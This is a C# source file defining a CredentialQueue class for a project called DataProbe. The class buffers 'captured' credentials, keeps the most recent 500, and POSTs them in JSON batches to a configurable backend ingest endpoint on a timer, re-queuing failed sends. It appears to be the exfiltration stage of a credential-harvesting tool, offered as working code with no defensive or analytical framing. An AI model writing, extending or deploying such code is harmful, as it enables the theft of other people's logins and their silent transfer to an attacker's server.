using System.Collections.Concurrent;
using System.Text.Json;

namespace DataProbe.Core;

/// <summary>
/// 线程安全的凭证队列。
/// 支持异步批量发送到后端，本地缓冲，自动重试。
/// </summary>
public class CredentialQueue : IDisposable
{
    private readonly ConcurrentQueue<Credential> _queue = new();
    private readonly List<Credential> _recent = new();
    private readonly DataProbeConfig _config;
    private readonly HttpClient _http;
    private readonly Timer _timer;
    private long _totalEnqueued;
    private long _totalSent;
    private long _totalFailed;
    private bool _disposed;

    public event Action<Credential>? OnCredentialCaptured;

    public long TotalEnqueued => Interlocked.Read(ref _totalEnqueued);
    public long TotalSent => Interlocked.Read(ref _totalSent);
    public long TotalFailed => Interlocked.Read(ref _totalFailed);
    public int PendingCount => _queue.Count;

    public CredentialQueue(DataProbeConfig config)
    {
        _config = config;
        _http = new HttpClient { Timeout = TimeSpan.FromSeconds(config.HttpTimeoutSec) };
        _timer = new Timer(async _ => await FlushAsync(), null,
            config.BatchIntervalMs, config.BatchIntervalMs);
    }

    public async Task EnqueueAsync(Credential cred)
    {
        if (_disposed) return;
        _queue.Enqueue(cred);
        Interlocked.Increment(ref _totalEnqueued);
        OnCredentialCaptured?.Invoke(cred);

        lock (_recent) { _recent.Add(cred); if (_recent.Count > 500) _recent.RemoveRange(0, _recent.Count - 500); }

        // Immediate flush if batch size reached
        if (_queue.Count >= _config.BatchSize)
            await FlushAsync();
    }

    public List<Credential> GetRecentCredentials()
    {
        lock (_recent) return new List<Credential>(_recent);
    }

    private async Task FlushAsync()
    {
        if (string.IsNullOrEmpty(_config.BackendUrl)) return;
        if (_queue.IsEmpty) return;

        var batch = new List<Credential>();
        while (batch.Count < _config.BatchSize && _queue.TryDequeue(out var c))
            batch.Add(c);

        if (batch.Count == 0) return;

        try
        {
            var payload = batch.Select(c => c.ToPayload()).ToList();
            var url = $"{_config.BackendUrl.TrimEnd('/')}/{_config.IngestEndpoint.TrimStart('/')}";
            var json = JsonSerializer.Serialize(payload);
            var content = new StringContent(json, System.Text.Encoding.UTF8, "application/json");

            var response = await _http.PostAsync(url, content);
            if (response.IsSuccessStatusCode)
                Interlocked.Add(ref _totalSent, batch.Count);
            else
            {
                Interlocked.Add(ref _totalFailed, batch.Count);
                // Re-queue on failure
                foreach (var c in batch) _queue.Enqueue(c);
            }
        }
        catch
        {
            Interlocked.Add(ref _totalFailed, batch.Count);
            foreach (var c in batch) _queue.Enqueue(c);
        }
    }

    public void Dispose()
    {
        if (_disposed) return;
        _disposed = true;
        _timer.Dispose();
        _http.Dispose();
    }
}
